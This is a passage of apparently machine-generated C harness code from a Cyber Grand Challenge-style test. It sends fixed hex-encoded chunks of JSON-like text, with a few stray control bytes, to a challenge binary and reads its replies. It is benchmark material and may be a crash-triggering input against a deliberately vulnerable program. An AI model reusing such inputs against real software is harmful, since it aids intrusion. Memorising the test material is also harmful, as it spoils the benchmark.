      static unsigned int write_00031_00000_len = 16;
      unsigned char *write_00031 = NULL;
      unsigned int write_00031_len = 0;
      write_00031 = cgc_append_buf(write_00031, &write_00031_len, write_00031_00000, write_00031_00000_len);
      if (write_00031_len > 0) {
         cgc_transmit_all(1, write_00031, write_00031_len);
      }
      cgc_free(write_00031);
   } while (0);
   do {
      unsigned char *read_00032;
      unsigned int read_00032_len;
      unsigned int read_00032_ptr = 0;
      //**** length read
      read_00032_len = 25;
      read_00032 = (unsigned char*)cgc_malloc(read_00032_len);
      int read_00032_res = cgc_length_read(0, read_00032, read_00032_len);
      if (read_00032_res) {} //silence unused variable warning
      cgc_free(read_00032);
      if (read_00032_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00032_00000[] = 
         "\x4c\x6e\x45\x67\x76\x77\x75\x7a\x50\x63\x52\x63\x73\x50\x6c\x78";
      static unsigned int write_00032_00000_len = 16;
      unsigned char *write_00032 = NULL;
      unsigned int write_00032_len = 0;
      write_00032 = cgc_append_buf(write_00032, &write_00032_len, write_00032_00000, write_00032_00000_len);
      if (write_00032_len > 0) {
         cgc_transmit_all(1, write_00032, write_00032_len);
      }
      cgc_free(write_00032);
   } while (0);
   do {
      unsigned char *read_00033;
      unsigned int read_00033_len;
      unsigned int read_00033_ptr = 0;
      //**** length read
      read_00033_len = 25;
      read_00033 = (unsigned char*)cgc_malloc(read_00033_len);
      int read_00033_res = cgc_length_read(0, read_00033, read_00033_len);
      if (read_00033_res) {} //silence unused variable warning
      cgc_free(read_00033);
      if (read_00033_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00033_00000[] = 
         "\x44\x6b\x7a\x6a\x58\x76\x47\x45\x4a\x7a\x22\x2c\x20\x22\x44\x41";
      static unsigned int write_00033_00000_len = 16;
      unsigned char *write_00033 = NULL;
      unsigned int write_00033_len = 0;
      write_00033 = cgc_append_buf(write_00033, &write_00033_len, write_00033_00000, write_00033_00000_len);
      if (write_00033_len > 0) {
         cgc_transmit_all(1, write_00033, write_00033_len);
      }
      cgc_free(write_00033);
   } while (0);
   do {
      unsigned char *read_00034;
      unsigned int read_00034_len;
      unsigned int read_00034_ptr = 0;
      //**** length read
      read_00034_len = 25;
      read_00034 = (unsigned char*)cgc_malloc(read_00034_len);
      int read_00034_res = cgc_length_read(0, read_00034, read_00034_len);
      if (read_00034_res) {} //silence unused variable warning
      cgc_free(read_00034);
      if (read_00034_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00034_00000[] = 
         "\x77\x42\x77\x66\x55\x77\x51\x54\x46\x67\x69\x4f\x68\x50\x5a\x75";
      static unsigned int write_00034_00000_len = 16;
      unsigned char *write_00034 = NULL;
      unsigned int write_00034_len = 0;
      write_00034 = cgc_append_buf(write_00034, &write_00034_len, write_00034_00000, write_00034_00000_len);
      if (write_00034_len > 0) {
         cgc_transmit_all(1, write_00034, write_00034_len);
      }
      cgc_free(write_00034);
   } while (0);
   do {
      unsigned char *read_00035;
      unsigned int read_00035_len;
      unsigned int read_00035_ptr = 0;
      //**** length read
      read_00035_len = 25;
      read_00035 = (unsigned char*)cgc_malloc(read_00035_len);
      int read_00035_res = cgc_length_read(0, read_00035, read_00035_len);
      if (read_00035_res) {} //silence unused variable warning
      cgc_free(read_00035);
      if (read_00035_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00035_00000[] = 
         "\x6d\x56\x63\x01\x46\x59\x4a\x22\x3a\x20\x22\x52\x7a\x75\x51\x65";
      static unsigned int write_00035_00000_len = 16;
      unsigned char *write_00035 = NULL;
      unsigned int write_00035_len = 0;
      write_00035 = cgc_append_buf(write_00035, &write_00035_len, write_00035_00000, write_00035_00000_len);
      if (write_00035_len > 0) {
         cgc_transmit_all(1, write_00035, write_00035_len);
      }
      cgc_free(write_00035);
   } while (0);
   do {
      unsigned char *read_00036;
      unsigned int read_00036_len;
      unsigned int read_00036_ptr = 0;
      //**** length read
      read_00036_len = 25;
      read_00036 = (unsigned char*)cgc_malloc(read_00036_len);
      int read_00036_res = cgc_length_read(0, read_00036, read_00036_len);
      if (read_00036_res) {} //silence unused variable warning
      cgc_free(read_00036);
      if (read_00036_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00036_00000[] = 
         "\x4e\x6c\x50\x6e\x75\x00\x01\x00\x00\x78\x71\x6e\x6f\x6e\x22\x2c";
      static unsigned int write_00036_00000_len = 16;
      unsigned char *write_00036 = NULL;
      unsigned int write_00036_len = 0;
      write_00036 = cgc_append_buf(write_00036, &write_00036_len, write_00036_00000, write_00036_00000_len);
      if (write_00036_len > 0) {
         cgc_transmit_all(1, write_00036, write_00036_len);
      }
      cgc_free(write_00036);
   } while (0);
   do {
      unsigned char *read_00037;
      unsigned int read_00037_len;
      unsigned int read_00037_ptr = 0;
      //**** length read
      read_00037_len = 25;
      read_00037 = (unsigned char*)cgc_malloc(read_00037_len);
      int read_00037_res = cgc_length_read(0, read_00037, read_00037_len);
      if (read_00037_res) {} //silence unused variable warning
      cgc_free(read_00037);
      if (read_00037_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00037_00000[] = 
         "\x20\x22\x74\x78\x79\x42\x57\x6b\x75\x77\x43\x75\x64\x62\x68\x53";
      static unsigned int write_00037_00000_len = 16;
      unsigned char *write_00037 = NULL;
      unsigned int write_00037_len = 0;
      write_00037 = cgc_append_buf(write_00037, &write_00037_len, write_00037_00000, write_00037_00000_len);
      if (write_00037_len > 0) {
         cgc_transmit_all(1, write_00037, write_00037_len);
      }
      cgc_free(write_00037);
   } while (0);
   do {
      unsigned char *read_00038;
      unsigned int read_00038_len;
      unsigned int read_00038_ptr = 0;
      //**** length read
      read_00038_len = 25;
      read_00038 = (unsigned char*)cgc_malloc(read_00038_len);
      int read_00038_res = cgc_length_read(0, read_00038, read_00038_len);
      if (read_00038_res) {} //silence unused variable warning
      cgc_free(read_00038);
      if (read_00038_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00038_00000[] = 
         "\x51\x57\x56\x4f\x59\x4e\x48\x47\x54\x50\x73\x62\x6b\x44\x54\x6e";
      static unsigned int write_00038_00000_len = 16;
      unsigned char *write_00038 = NULL;
      unsigned int write_00038_len = 0;
      write_00038 = cgc_append_buf(write_00038, &write_00038_len, write_00038_00000, write_00038_00000_len);
      if (write_00038_len > 0) {
         cgc_transmit_all(1, write_00038, write_00038_len);
      }
      cgc_free(write_00038);
   } while (0);
   do {
      unsigned char *read_00039;
      unsigned int read_00039_len;
      unsigned int read_00039_ptr = 0;
      //**** length read
      read_00039_len = 25;
      read_00039 = (unsigned char*)cgc_malloc(read_00039_len);
      int read_00039_res = cgc_length_read(0, read_00039, read_00039_len);
      if (read_00039_res) {} //silence unused variable warning
      cgc_free(read_00039);
      if (read_00039_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00039_00000[] = 
         "\x7a\x6e\x59\x4c\x75\x6f\x55\x49\x58\x79\x66\x55\x59\x4d\x44\x50";
      static unsigned int write_00039_00000_len = 16;
      unsigned char *write_00039 = NULL;
      unsigned int write_00039_len = 0;
      write_00039 = cgc_append_buf(write_00039, &write_00039_len, write_00039_00000, write_00039_00000_len);
      if (write_00039_len > 0) {
         cgc_transmit_all(1, write_00039, write_00039_len);
      }
      cgc_free(write_00039);
   } while (0);
   do {
      unsigned char *read_00040;
      unsigned int read_00040_len;
      unsigned int read_00040_ptr = 0;
      //**** length read
      read_00040_len = 25;
      read_00040 = (unsigned char*)cgc_malloc(read_00040_len);
      int read_00040_res = cgc_length_read(0, read_00040, read_00040_len);
      if (read_00040_res) {} //silence unused variable warning
      cgc_free(read_00040);
      if (read_00040_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00040_00000[] = 
         "\x71\x5a\x61\x53\x45\x54\x48\x76\x72\x74\x50\x66\x51\x48\x54\x57";
      static unsigned int write_00040_00000_len = 16;
      unsigned char *write_00040 = NULL;
      unsigned int write_00040_len = 0;
      write_00040 = cgc_append_buf(write_00040, &write_00040_len, write_00040_00000, write_00040_00000_len);
      if (write_00040_len > 0) {
         cgc_transmit_all(1, write_00040, write_00040_len);
      }
      cgc_free(write_00040);
   } while (0);
   do {
      unsigned char *read_00041;
      unsigned int read_00041_len;
      unsigned int read_00041_ptr = 0;
      //**** length read
      read_00041_len = 25;
      read_00041 = (unsigned char*)cgc_malloc(read_00041_len);
      int read_00041_res = cgc_length_read(0, read_00041, read_00041_len);
      if (read_00041_res) {} //silence unused variable warning
      cgc_free(read_00041);
      if (read_00041_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00041_00000[] = 
         "\x22\x3a\x20\x31\x2e\x32\x39\x2c\x20\x22\x53\x22\x3a\x20\x2d\x30";
      static unsigned int write_00041_00000_len = 16;
      unsigned char *write_00041 = NULL;
      unsigned int write_00041_len = 0;
      write_00041 = cgc_append_buf(write_00041, &write_00041_len, write_00041_00000, write_00041_00000_len);
      if (write_00041_len > 0) {
         cgc_transmit_all(1, write_00041, write_00041_len);
      }
      cgc_free(write_00041);
   } while (0);
   do {
      unsigned char *read_00042;
      unsigned int read_00042_len;
      unsigned int read_00042_ptr = 0;
      //**** length read
      read_00042_len = 25;
      read_00042 = (unsigned char*)cgc_malloc(read_00042_len);
      int read_00042_res = cgc_length_read(0, read_00042, read_00042_len);
      if (read_00042_res) {} //silence unused variable warning
      cgc_free(read_00042);
      if (read_00042_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00042_00000[] = 
         "\x2e\x31\x36\x7d\x2c\x20\x22\x4b\x65\x69\x6c\x6a\x54\x48\x6a\x43";
      static unsigned int write_00042_00000_len = 16;
      unsigned char *write_00042 = NULL;
      unsigned int write_00042_len = 0;
      write_00042 = cgc_append_buf(write_00042, &write_00042_len, write_00042_00000, write_00042_00000_len);
      if (write_00042_len > 0) {
         cgc_transmit_all(1, write_00042, write_00042_len);
      }
      cgc_free(write_00042);
   } while (0);
   do {
      unsigned char *read_00043;
      unsigned int read_00043_len;
      unsigned int read_00043_ptr = 0;
      //**** length read
      read_00043_len = 25;
      read_00043 = (unsigned char*)cgc_malloc(read_00043_len);
      int read_00043_res = cgc_length_read(0, read_00043, read_00043_len);
      if (read_00043_res) {} //silence unused variable warning
      cgc_free(read_00043);
      if (read_00043_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00043_00000[] = 
         "\x72\x74\x6b\x75\x4b\x79\x46\x77\x48\x22\x3a\x20\x7b\x22\x4d\x55";
      static unsigned int write_00043_00000_len = 16;
      unsigned char *write_00043 = NULL;
      unsigned int write_00043_len = 0;
      write_00043 = cgc_append_buf(write_00043, &write_00043_len, write_00043_00000, write_00043_00000_len);
      if (write_00043_len > 0) {
         cgc_transmit_all(1, write_00043, write_00043_len);
      }
      cgc_free(write_00043);
   } while (0);
   do {
      unsigned char *read_00044;
      unsigned int read_00044_len;
      unsigned int read_00044_ptr = 0;
      //**** length read
      read_00044_len = 25;
      read_00044 = (unsigned char*)cgc_malloc(read_00044_len);
      int read_00044_res = cgc_length_read(0, read_00044, read_00044_len);
      if (read_00044_res) {} //silence unused variable warning
      cgc_free(read_00044);
      if (read_00044_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00044_00000[] = 
         "\x47\x4d\x53\x58\x6c\x4f\x57\x5a\x73\x6d\x6d\x51\x62\x22\x3a\x20";
      static unsigned int write_00044_00000_len = 16;
      unsigned char *write_00044 = NULL;
      unsigned int write_00044_len = 0;
      write_00044 = cgc_append_buf(write_00044, &write_00044_len, write_00044_00000, write_00044_00000_len);
      if (write_00044_len > 0) {
         cgc_transmit_all(1, write_00044, write_00044_len);
      }
      cgc_free(write_00044);
   } while (0);
   do {
      unsigned char *read_00045;
      unsigned int read_00045_len;
      unsigned int read_00045_ptr = 0;
      //**** length read
      read_00045_len = 25;
      read_00045 = (unsigned char*)cgc_malloc(read_00045_len);
      int read_00045_res = cgc_length_read(0, read_00045, read_00045_len);
      if (read_00045_res) {} //silence unused variable warning
      cgc_free(read_00045);
      if (read_00045_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00045_00000[] = 
         "\x22\x4d\x4b\x61\x74\x22\x2c\x20\x22\x69\x46\x69\x53\x75\x76\x54";
      static unsigned int write_00045_00000_len = 16;
      unsigned char *write_00045 = NULL;
      unsigned int write_00045_len = 0;
      write_00045 = cgc_append_buf(write_00045, &write_00045_len, write_00045_00000, write_00045_00000_len);
      if (write_00045_len > 0) {
         cgc_transmit_all(1, write_00045, write_00045_len);
      }
      cgc_free(write_00045);
   } while (0);
   do {
      unsigned char *read_00046;
      unsigned int read_00046_len;
      unsigned int read_00046_ptr = 0;
      //**** length read
      read_00046_len = 25;
      read_00046 = (unsigned char*)cgc_malloc(read_00046_len);
      int read_00046_res = cgc_length_read(0, read_00046, read_00046_len);
      if (read_00046_res) {} //silence unused variable warning
      cgc_free(read_00046);
      if (read_00046_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00046_00000[] = 
         "\x55\x5a\x57\x79\x7a\x49\x74\x70\x68\x73\x65\x52\x4b\x4b\x47\x4b";
      static unsigned int write_00046_00000_len = 16;
      unsigned char *write_00046 = NULL;
      unsigned int write_00046_len = 0;
      write_00046 = cgc_append_buf(write_00046, &write_00046_len, write_00046_00000, write_00046_00000_len);
      if (write_00046_len > 0) {
         cgc_transmit_all(1, write_00046, write_00046_len);
      }
      cgc_free(write_00046);
   } while (0);
   do {
      unsigned char *read_00047;
      unsigned int read_00047_len;
      unsigned int read_00047_ptr = 0;
      //**** length read
      read_00047_len = 25;
      read_00047 = (unsigned char*)cgc_malloc(read_00047_len);
      int read_00047_res = cgc_length_read(0, read_00047, read_00047_len);
      if (read_00047_res) {} //silence unused variable warning
      cgc_free(read_00047);
      if (read_00047_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00047_00000[] = 
         "\x47\x50\x77\x6b\x53\x76\x52\x77\x6f\x50\x6a\x53\x59\x68\x70\x50";
      static unsigned int write_00047_00000_len = 16;
      unsigned char *write_00047 = NULL;
      unsigned int write_00047_len = 0;
      write_00047 = cgc_append_buf(write_00047, &write_00047_len, write_00047_00000, write_00047_00000_len);
      if (write_00047_len > 0) {
         cgc_transmit_all(1, write_00047, write_00047_len);
      }
      cgc_free(write_00047);
   } while (0);
   do {
      unsigned char *read_00048;
      unsigned int read_00048_len;
      unsigned int read_00048_ptr = 0;
      //**** length read
      read_00048_len = 25;
      read_00048 = (unsigned char*)cgc_malloc(read_00048_len);
      int read_00048_res = cgc_length_read(0, read_00048, read_00048_len);
      if (read_00048_res) {} //silence unused variable warning
      cgc_free(read_00048);
      if (read_00048_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00048_00000[] = 
         "\x6e\x4d\x6c\x65\x4a\x66\x46\x67\x42\x6e\x41\x44\x73\x6d\x42\x54";
      static unsigned int write_00048_00000_len = 16;
      unsigned char *write_00048 = NULL;
      unsigned int write_00048_len = 0;
      write_00048 = cgc_append_buf(write_00048, &write_00048_len, write_00048_00000, write_00048_00000_len);
      if (write_00048_len > 0) {
         cgc_transmit_all(1, write_00048, write_00048_len);
      }
      cgc_free(write_00048);
   } while (0);
   do {
      unsigned char *read_00049;
      unsigned int read_00049_len;
      unsigned int read_00049_ptr = 0;
      //**** length read
      read_00049_len = 25;
      read_00049 = (unsigned char*)cgc_malloc(read_00049_len);
      int read_00049_res = cgc_length_read(0, read_00049, read_00049_len);
      if (read_00049_res) {} //silence unused variable warning
      cgc_free(read_00049);
      if (read_00049_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00049_00000[] = 
         "\x58\x6b\x22\x3a\x20\x22\x64\x61\x4a\x6b\x65\x64\x6f\x76\x49\x54";
      static unsigned int write_00049_00000_len = 16;
      unsigned char *write_00049 = NULL;
      unsigned int write_00049_len = 0;
      write_00049 = cgc_append_buf(write_00049, &write_00049_len, write_00049_00000, write_00049_00000_len);
      if (write_00049_len > 0) {
         cgc_transmit_all(1, write_00049, write_00049_len);
      }
      cgc_free(write_00049);
   } while (0);
   do {
      unsigned char *read_00050;
      unsigned int read_00050_len;
      unsigned int read_00050_ptr = 0;
      //**** length read
      read_00050_len = 25;
      read_00050 = (unsigned char*)cgc_malloc(read_00050_len);
      int read_00050_res = cgc_length_read(0, read_00050, read_00050_len);
      if (read_00050_res) {} //silence unused variable warning
      cgc_free(read_00050);
      if (read_00050_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00050_00000[] = 
         "\x53\x53\x6c\x4e\x4b\x53\x56\x71\x63\x56\x57\x72\x53\x47\x45\x4c";
      static unsigned int write_00050_00000_len = 16;
      unsigned char *write_00050 = NULL;
      unsigned int write_00050_len = 0;
      write_00050 = cgc_append_buf(write_00050, &write_00050_len, write_00050_00000, write_00050_00000_len);
      if (write_00050_len > 0) {
         cgc_transmit_all(1, write_00050, write_00050_len);
      }
      cgc_free(write_00050);
   } while (0);
   do {
      unsigned char *read_00051;
      unsigned int read_00051_len;
      unsigned int read_00051_ptr = 0;
      //**** length read
      read_00051_len = 25;
      read_00051 = (unsigned char*)cgc_malloc(read_00051_len);
      int read_00051_res = cgc_length_read(0, read_00051, read_00051_len);
      if (read_00051_res) {} //silence unused variable warning
      cgc_free(read_00051);
      if (read_00051_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00051_00000[] = 
         "\x43\x6f\x72\x72\x69\x6e\x58\x4a\x72\x6d\x6a\x69\x69\x59\x49\x69";
      static unsigned int write_00051_00000_len = 16;
      unsigned char *write_00051 = NULL;
      unsigned int write_00051_len = 0;
      write_00051 = cgc_append_buf(write_00051, &write_00051_len, write_00051_00000, write_00051_00000_len);
      if (write_00051_len > 0) {
         cgc_transmit_all(1, write_00051, write_00051_len);
      }
      cgc_free(write_00051);
   } while (0);
   do {
      unsigned char *read_00052;
      unsigned int read_00052_len;
      unsigned int read_00052_ptr = 0;
      //**** length read
      read_00052_len = 25;
      read_00052 = (unsigned char*)cgc_malloc(read_00052_len);
      int read_00052_res = cgc_length_read(0, read_00052, read_00052_len);
      if (read_00052_res) {} //silence unused variable warning
      cgc_free(read_00052);
      if (read_00052_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00052_00000[] = 
         "\x51\x66\x65\x51\x66\x36\x56\x58\x59\x22\x2c\x20\x22\x67\x69\x49";
      static unsigned int write_00052_00000_len = 16;
      unsigned char *write_00052 = NULL;
      unsigned int write_00052_len = 0;
      write_00052 = cgc_append_buf(write_00052, &write_00052_len, write_00052_00000, write_00052_00000_len);
      if (write_00052_len > 0) {
         cgc_transmit_all(1, write_00052, write_00052_len);
      }
      cgc_free(write_00052);
   } while (0);
   do {
      unsigned char *read_00053;
      unsigned int read_00053_len;
      unsigned int read_00053_ptr = 0;
      //**** length read
      read_00053_len = 25;
      read_00053 = (unsigned char*)cgc_malloc(read_00053_len);
      int read_00053_res = cgc_length_read(0, read_00053, read_00053_len);
      if (read_00053_res) {} //silence unused variable warning
      cgc_free(read_00053);
      if (read_00053_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00053_00000[] = 
         "\x75\x6a\x66\x62\x45\x4d\x4c\x49\x46\x76\x57\x49\x53\x73\x6f\x64";
      static unsigned int write_00053_00000_len = 16;
      unsigned char *write_00053 = NULL;
      unsigned int write_00053_len = 0;
      write_00053 = cgc_append_buf(write_00053, &write_00053_len, write_00053_00000, write_00053_00000_len);
      if (write_00053_len > 0) {
         cgc_transmit_all(1, write_00053, write_00053_len);
      }
      cgc_free(write_00053);
   } while (0);
   do {
      unsigned char *read_00054;
      unsigned int read_00054_len;
      unsigned int read_00054_ptr = 0;
      //**** length read
      read_00054_len = 25;
      read_00054 = (unsigned char*)cgc_malloc(read_00054_len);
      int read_00054_res = cgc_length_read(0, read_00054, read_00054_len);
      if (read_00054_res) {} //silence unused variable warning
      cgc_free(read_00054);
      if (read_00054_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00054_00000[] = 
         "\x42\x41\x41\x55\x70\x4a\x63\x43\x65\x42\x77\x47\x4a\x53\x56\x58";
      static unsigned int write_00054_00000_len = 16;
      unsigned char *write_00054 = NULL;
      unsigned int write_00054_len = 0;
      write_00054 = cgc_append_buf(write_00054, &write_00054_len, write_00054_00000, write_00054_00000_len);
      if (write_00054_len > 0) {
         cgc_transmit_all(1, write_00054, write_00054_len);
      }
      cgc_free(write_00054);
   } while (0);
   do {
      unsigned char *read_00055;
      unsigned int read_00055_len;
      unsigned int read_00055_ptr = 0;
      //**** length read
      read_00055_len = 25;
      read_00055 = (unsigned char*)cgc_malloc(read_00055_len);
      int read_00055_res = cgc_length_read(0, read_00055, read_00055_len);
      if (read_00055_res) {} //silence unused variable warning
      cgc_free(read_00055);
      if (read_00055_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00055_00000[] = 
         "\x6e\x71\x22\x3a\x20\x2d\x32\x30\x30\x30\x31\x30\x34\x6a\x79\x79";
      static unsigned int write_00055_00000_len = 16;
      unsigned char *write_00055 = NULL;
      unsigned int write_00055_len = 0;
      write_00055 = cgc_append_buf(write_00055, &write_00055_len, write_00055_00000, write_00055_00000_len);
      if (write_00055_len > 0) {
         cgc_transmit_all(1, write_00055, write_00055_len);
      }
      cgc_free(write_00055);
   } while (0);
   do {
      unsigned char *read_00056;
      unsigned int read_00056_len;
      unsigned int read_00056_ptr = 0;
      //**** length read
      read_00056_len = 25;
      read_00056 = (unsigned char*)cgc_malloc(read_00056_len);
      int read_00056_res = cgc_length_read(0, read_00056, read_00056_len);
      if (read_00056_res) {} //silence unused variable warning
      cgc_free(read_00056);
      if (read_00056_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00056_00000[] = 
         "\x73\x49\x75\x41\x45\x78\x56\x65\x77\x4b\x4a\x46\x46\x77\x59\x48";
      static unsigned int write_00056_00000_len = 16;
      unsigned char *write_00056 = NULL;
      unsigned int write_00056_len = 0;
      write_00056 = cgc_append_buf(write_00056, &write_00056_len, write_00056_00000, write_00056_00000_len);
      if (write_00056_len > 0) {
         cgc_transmit_all(1, write_00056, write_00056_len);
      }
      cgc_free(write_00056);
   } while (0);
   do {
      unsigned char *read_00057;
      unsigned int read_00057_len;
      unsigned int read_00057_ptr = 0;
      //**** length read
      read_00057_len = 25;
      read_00057 = (unsigned char*)cgc_malloc(read_00057_len);
      int read_00057_res = cgc_length_read(0, read_00057, read_00057_len);
      if (read_00057_res) {} //silence unused variable warning
      cgc_free(read_00057);
      if (read_00057_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00057_00000[] = 
         "\x62\x57\x4d\x58\x72\x77\x6e\x64\x4a\x6e\x54\x50\x4a\x61\x6c\x64";
      static unsigned int write_00057_00000_len = 16;
      unsigned char *write_00057 = NULL;
      unsigned int write_00057_len = 0;
      write_00057 = cgc_append_buf(write_00057, &write_00057_len, write_00057_00000, write_00057_00000_len);
      if (write_00057_len > 0) {
         cgc_transmit_all(1, write_00057, write_00057_len);
      }
      cgc_free(write_00057);
   } while (0);
   do {
      unsigned char *read_00058;
      unsigned int read_00058_len;
      unsigned int read_00058_ptr = 0;
      //**** length read
      read_00058_len = 25;
      read_00058 = (unsigned char*)cgc_malloc(read_00058_len);
      int read_00058_res = cgc_length_read(0, read_00058, read_00058_len);
      if (read_00058_res) {} //silence unused variable warning
      cgc_free(read_00058);
      if (read_00058_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00058_00000[] = 
         "\x55\x6c\x70\x7a\x56\x56\x57\x79\x78\x43\x56\x54\x79\x56\x6d\x58";
      static unsigned int write_00058_00000_len = 16;
      unsigned char *write_00058 = NULL;
      unsigned int write_00058_len = 0;
      write_00058 = cgc_append_buf(write_00058, &write_00058_len, write_00058_00000, write_00058_00000_len);
      if (write_00058_len > 0) {
         cgc_transmit_all(1, write_00058, write_00058_len);
      }
      cgc_free(write_00058);
   } while (0);
   do {
      unsigned char *read_00059;
      unsigned int read_00059_len;
      unsigned int read_00059_ptr = 0;
      //**** length read
      read_00059_len = 25;
      read_00059 = (unsigned char*)cgc_malloc(read_00059_len);
      int read_00059_res = cgc_length_read(0, read_00059, read_00059_len);
      if (read_00059_res) {} //silence unused variable warning
      cgc_free(read_00059);
      if (read_00059_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00059_00000[] = 
         "\x62\x5a\x62\x65\xff\x6d\x74\x72\x65\x68\x52\x4d\x77\x6d\x58\x44";
      static unsigned int write_00059_00000_len = 16;
      unsigned char *write_00059 = NULL;
      unsigned int write_00059_len = 0;
      write_00059 = cgc_append_buf(write_00059, &write_00059_len, write_00059_00000, write_00059_00000_len);
      if (write_00059_len > 0) {
         cgc_transmit_all(1, write_00059, write_00059_len);
      }
      cgc_free(write_00059);
   } while (0);
   do {
      unsigned char *read_00060;
      unsigned int read_00060_len;
      unsigned int read_00060_ptr = 0;
      //**** length read
      read_00060_len = 25;
      read_00060 = (unsigned char*)cgc_malloc(read_00060_len);
      int read_00060_res = cgc_length_read(0, read_00060, read_00060_len);
      if (read_00060_res) {} //silence unused variable warning
      cgc_free(read_00060);
      if (read_00060_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00060_00000[] = 
         "\x71\x6f\x61\x70\x67\x50\x46\x41\x6f\x6a\x6e\x52\x49\x4b\x44\x59";
      static unsigned int write_00060_00000_len = 16;
      unsigned char *write_00060 = NULL;
      unsigned int write_00060_len = 0;
      write_00060 = cgc_append_buf(write_00060, &write_00060_len, write_00060_00000, write_00060_00000_len);
      if (write_00060_len > 0) {
         cgc_transmit_all(1, write_00060, write_00060_len);
      }
      cgc_free(write_00060);
   } while (0);
   do {
      unsigned char *read_00061;
      unsigned int read_00061_len;
      unsigned int read_00061_ptr = 0;
      //**** length read
      read_00061_len = 25;
      read_00061 = (unsigned char*)cgc_malloc(read_00061_len);
      int read_00061_res = cgc_length_read(0, read_00061, read_00061_len);
      if (read_00061_res) {} //silence unused variable warning
      cgc_free(read_00061);
      if (read_00061_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00061_00000[] = 
         "\x6a\x48\x63\x52\x64\x4b\x4d\x66\x72\x55\x58\x46\x79\x69\x54\x4d";
      static unsigned int write_00061_00000_len = 16;
      unsigned char *write_00061 = NULL;
      unsigned int write_00061_len = 0;
      write_00061 = cgc_append_buf(write_00061, &write_00061_len, write_00061_00000, write_00061_00000_len);
      if (write_00061_len > 0) {
         cgc_transmit_all(1, write_00061, write_00061_len);
      }
      cgc_free(write_00061);
   } while (0);
   do {
      unsigned char *read_00062;
      unsigned int read_00062_len;
      unsigned int read_00062_ptr = 0;
      //**** length read
      read_00062_len = 25;
      read_00062 = (unsigned char*)cgc_malloc(read_00062_len);
      int read_00062_res = cgc_length_read(0, read_00062, read_00062_len);
      if (read_00062_res) {} //silence unused variable warning
      cgc_free(read_00062);
      if (read_00062_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00062_00000[] = 
         "\x68\x4c\x4e\x70\x42\x77\x4d\x66\x4d\x58\x66\x58\x4b\x58\x42\x22";
      static unsigned int write_00062_00000_len = 16;
      unsigned char *write_00062 = NULL;
      unsigned int write_00062_len = 0;
      write_00062 = cgc_append_buf(write_00062, &write_00062_len, write_00062_00000, write_00062_00000_len);
      if (write_00062_len > 0) {
         cgc_transmit_all(1, write_00062, write_00062_len);
      }
      cgc_free(write_00062);
   } while (0);
   do {
      unsigned char *read_00063;
      unsigned int read_00063_len;
      unsigned int read_00063_ptr = 0;
      //**** length read
      read_00063_len = 25;
      read_00063 = (unsigned char*)cgc_malloc(read_00063_len);
      int read_00063_res = cgc_length_read(0, read_00063, read_00063_len);
      if (read_00063_res) {} //silence unused variable warning
      cgc_free(read_00063);
      if (read_00063_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00063_00000[] = 
         "\x3a\x20\x2d\x30\x2e\x31\x32\x2c\x20\x22\x71\x6b\x22\x3a\x20\x6e";
      static unsigned int write_00063_00000_len = 16;
      unsigned char *write_00063 = NULL;
      unsigned int write_00063_len = 0;
      write_00063 = cgc_append_buf(write_00063, &write_00063_len, write_00063_00000, write_00063_00000_len);
      if (write_00063_len > 0) {
         cgc_transmit_all(1, write_00063, write_00063_len);
      }
      cgc_free(write_00063);
   } while (0);
   do {
      unsigned char *read_00064;
      unsigned int read_00064_len;
      unsigned int read_00064_ptr = 0;
      //**** length read
      read_00064_len = 25;
      read_00064 = (unsigned char*)cgc_malloc(read_00064_len);
      int read_00064_res = cgc_length_read(0, read_00064, read_00064_len);
      if (read_00064_res) {} //silence unused variable warning
      cgc_free(read_00064);
      if (read_00064_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00064_00000[] = 
